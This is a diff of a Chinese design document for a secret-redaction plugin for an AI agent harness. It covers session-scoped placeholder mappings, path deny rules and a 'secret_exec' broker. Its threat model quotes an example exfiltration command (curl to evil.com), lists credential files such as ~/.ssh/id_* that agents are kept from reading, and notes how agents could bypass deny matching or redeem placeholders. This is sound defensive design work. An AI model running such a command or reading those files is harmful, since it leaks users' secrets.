@@ -37,13 +37,21 @@ DSH 把"发给 LLM 的请求"定义为**会话日志的纯函数**,且在 `llm/s
 
 ## 存储
 
-`~/.dsh/redaction/`(0700):`key`(0600,首运行生成,权限漂移自动修正)、`map.jsonl`(0600,append-only)。不依赖 umask,创建显式传 mode。增长只随不同秘密数量;不淘汰,清理 = 手动删行;加载容忍坏行。映射只服务用户查询,运行时正确性不依赖它。
+持久化的只有 HMAC key:`~/.dsh/redaction/key`(0600,目录 0700,首运行生成,权限漂移自动修正)。key 让占位符跨会话/重启稳定——纯函数,不需要持久映射表。不依赖 umask,创建显式传 mode。
+
+**映射不落盘(2026-07 决策,推翻初版的 map.jsonl)。** 初版把映射写成全局 append-only 的 map.jsonl,定位是"审计副产物 + 用户 grep reveal"。broker 工具引入后威胁模型变了:占位符从展示符号变成**可兑现凭证**,全局持久映射等于永久 bearer token——任何会话的 agent 拿到占位符字符串(旧会话日志、别的会话、本对话本身都满是占位符)就能让 broker 用真值执行。修复不是给磁盘表加 ACL(权限丢了磁盘内容仍在,纯攻击面),而是把映射改为**会话作用域内存表**:按 `Agent.id`(= SessionId)分桶,进程死即蒸发,可兑现 ⟺ 真值在本会话本进程真实流经过。拿不到会话身份的挂点(遥测兜底)进匿名桶,脱敏生效但永不解析(fail-closed)。
+
+代价(知情接受):历史占位符的离线 reveal 没了;重启后想用 broker 需秘密重新流入会话(用户重贴/工具重读)——这同时是特性:兑现能力不能从持久状态复活。跨会话占位符稳定性由持久 key 保留(同秘密同占位符),不受影响。跨会话碰撞别名不做检测:~10⁻⁷ 量级,且兑现只发生在值真实流过的会话内,别名无安全后果。subagent 是独立会话时,父会话看到的子会话占位符不可兑现(fail-closed 方向,接受)。
+
+内存安全论证:威胁模型不变(本机可信、出境不可信);host 进程本来就常驻 provider API key(env)、短暂经手脱敏前的明文工具结果,会话表不改变风险量级。残余风险逐项过:swap(macOS 默认加密)、core dump(Node 默认不产生)、同进程恶意插件(它注册一个排前面的 post-execute 监听器就能看到原文,插件信任是既有假设)、bug 把表序列化进日志(闭包私有 + post-execute 自愈重脱敏)。JS 做不到"用完即擦除"(字符串不可变、GC 不清零);TTL(vibeguard 的 1h)引入会话中途失效的混乱,不加。
 
 ## 访问控制(tools/pre-execute,src/guard.ts)
 
 deny 匹配是**字段感知**的:只检查各工具的"目标"参数(`command`/`file_path`/`path`/`workdir`/`cwd`/`directory` 等),不对整个参数 JSON 做子串匹配。初版的全 JSON 匹配在实践中立刻误伤——编辑 README 时 new_string 提到 deny 路径字样即被拦;真正的访问语义在目标参数里。目录条目(尾斜杠)对"引用目录本身"的写法用 `value + '/'` 归一匹配,不扩大到兄弟路径。
 
-固有局限(有意的取舍):bash 命令是自由文本,`cat $X`、`cd … && cat …` 这类拼接可绕过子串匹配。deny 防的是"agent 顺手把凭据文件(`~/.dsh/.credentials.yaml`、`~/.dsh/redaction/`、`~/.ssh/id_*` 等,可配置)读进上下文",不是对抗性绕过;真正的兜底仍是 post-execute 脱敏。访问控制对本插件自身的映射文件尤其重要:否则 map.jsonl 会被读进上下文再脱敏成占位符,等于把明文表拱手相送。
+固有局限(有意的取舍):bash 命令是自由文本,`cat $X`、`cd … && cat …` 这类拼接可绕过子串匹配。deny 防的是"agent 顺手把凭据文件(`~/.dsh/.credentials.yaml`、`~/.dsh/redaction/`、`~/.ssh/id_*` 等,可配置)读进上下文",不是对抗性绕过;真正的兜底仍是 post-execute 脱敏。访问控制对本插件自身的 `~/.dsh/redaction/` 目录尤其重要:key 泄露 + 提供商侧日志 = 低熵秘密可被离线字典验证。
+
+为什么不由 DSH 本体做:DSH 的访问控制是模式制沙箱(read-only / workspace-write / danger-full-access,OS 级执行)+ per-call 审批 + guard 扩展点,**没有 per-path deny**;本插件通过 `tools/pre-execute` waterfall 实现的就是 DSH 预留的接缝。默认列表里除 `~/.dsh/redaction/`(插件自保,不变量)外的条目性质上是用户策略,若 DSH 将来出正式的 per-path 策略配置,应迁过去。
 
 ## broker 工具:secret_exec(src/broker.ts)
 
@@ -53,14 +61,14 @@ DSH 工具参数的生命周期:模型发出调用 → 参数先写持久日志+
 
 ### 设计
 
-还原做成 secret_exec 的**声明语义**:命令带占位符落日志(干净、可审计),工具实现从映射查真值、在子进程内存里替换、spawn 执行,输出先把用过的真值换回占位符(不依赖规则命中)再过引擎。未知占位符拒绝执行并提示向用户要值。子进程环境复刻 dsh-subprocess 的 scrub(`/KEY|PASSWORD|SECRET|TOKEN/i` + `DSH_` 前缀不下发)——实测 bash 工具的子进程环境已被 harness 剥掉凭据形状变量,`$ENV_VAR` 式间接引用在 DSH 里默认是断的,broker 因此是"用真值执行"的唯一出口。
+还原做成 secret_exec 的**声明语义**:命令带占位符落日志(干净、可审计),工具实现从**本会话的内存桶**查真值、在子进程内存里替换、spawn 执行,输出先把用过的真值换回占位符(不依赖规则命中)再过引擎(记入本会话桶,因此 broker 输出里新出现的秘密随后也可在本会话兑现)。不可解析的占位符(未知/别会话/重启后)拒绝执行并提示请用户重贴;拿不到会话身份的调用 fail-closed。子进程环境复刻 dsh-subprocess 的 scrub(`/KEY|PASSWORD|SECRET|TOKEN/i` + `DSH_` 前缀不下发)——实测 bash 工具的子进程环境已被 harness 剥掉凭据形状变量,`$ENV_VAR` 式间接引用在 DSH 里默认是断的,broker 因此是"用真值执行"的唯一出口。
 
 ### 威胁语义
 
 - 真值全程不进上下文、不进日志,只存在于子进程内存;审批界面看到的是占位符命令。
+- 占位符是**会话作用域的一次性(进程期)凭证**,不是永久 bearer token:别的会话、旧日志、重启后的占位符都不可兑现(见「存储」节的决策)。
 - 模型可构造外发命令(curl -d <secret> evil.com)——与"用户直接告知密码"同级风险,用 `secretExec.requireApproval`(默认 true,走 DSH 审批流)把人放进环路;approval 策略 never 时自动拒绝。
-- 审计链 = 日志占位符命令 + map.jsonl(仅用户可读,broker 内部读不走工具管道、不受 deny 影响)。
-- map.jsonl 由此从"审计副产物"升格为 broker 的权威真值源,重启后加载即恢复还原能力。
+- 审计 = 日志里的占位符命令;可兑现性本身即"该秘密在本会话出现过"的证明,无需映射文件。
 
 ## 工程
 
